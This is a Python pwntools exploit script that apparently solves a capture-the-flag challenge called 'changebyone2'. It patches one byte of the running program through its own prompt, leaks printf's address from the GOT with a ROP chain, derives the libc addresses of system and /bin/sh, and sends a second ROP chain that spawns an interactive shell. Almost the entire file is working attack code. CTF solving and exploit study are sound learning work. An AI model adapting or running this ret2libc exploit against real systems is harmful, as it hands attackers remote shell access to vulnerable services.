#!/usr/bin/env python2

from pwn import *

#   400700:	48 89 c6             	mov    rsi,rax
#
#                    ||
#                   \  /
#                    \/
#
#   400700:     48 89 ee                mov    rsi,rbp

#def debug():
#    proc = process("./prog")
#
#    gdb.attach(proc, "break *0x40070d\n"
#                     "continue\n")
#    return proc

def begin():
    proc = remote("localhost", 5797)
    # change bytes 0x702 to 0xd6
    proc.recvuntil("[Y/n] : ")
    proc.sendline("Y")

    proc.recvuntil("offset : ")
    proc.sendline("0x702")

    proc.recvuntil("value : ")
    proc.sendline("0xee")

    return proc

def get_addr_printf(proc):

    binary = ELF("../export/changebyone2")
    addrgot_printf = binary.got["printf"]
    print("[+] Addr printf in GOT : %x" % addrgot_printf)
    addrplt_printf = binary.plt["printf"]
    print("[+] Addr printf in PLT : %x" % addrplt_printf)

    rop  = p64(0x0) # savrbp
    # firstarg : addrgot_printf
    rop += p64(0x00000000004007a3) # pop rdi; ret;
    rop += p64(addrgot_printf)
    rop += p64(addrplt_printf)
    rop += p64(0x0000000000400580) #_start

    proc.recvuntil("[4096 bytes] : ")
    proc.sendline(rop)
    proc.recvuntil("Have a good day")
    addr_str = proc.recvline().split("Welcome in complaints center.")[0]
    addr_str += "\0" * (8 - len(addr_str))
    addr_printf = u64(addr_str)
    print("[+] Addr printf : %x" % addr_printf)
    return addr_printf

def pop_shell(proc, addr_printf):
    libc = ELF('../export/libc.so.6')
    offset_printf = libc.symbols['printf']
    print("[+] Offset printf in libc : %x" % offset_printf)
    offset_system = libc.symbols['system']
    print("[+] Offset system in libc : %x" % offset_system)
    offset_bin_sh = list(libc.search('/bin/sh'))[0]
    print("[+] Offset /bin/sh : %x" % offset_bin_sh)

    addr_exit = addr_printf - offset_printf + libc.symbols['exit']
    addr_system = addr_printf - offset_printf + offset_system
    addr_bin_sh = addr_printf - offset_printf + offset_bin_sh

    rop  = p64(0x0) # savrbp
    rop += p64(0x00000000004007a3) # pop rdi; ret;
    rop += p64(addr_bin_sh)
    rop += p64(addr_system)
    rop += p64(0x00000000004007a3) # pop rdi; ret;
    rop += p64(0x0)
    rop += p64(addr_exit)

    proc.recvuntil("[4096 bytes] : ")
    proc.sendline(rop)
    proc.recvuntil("Have a good day")
    proc.interactive()

if __name__ == "__main__":
    proc = begin()
    addr_printf = get_addr_printf(proc)
    pop_shell(proc, addr_printf)


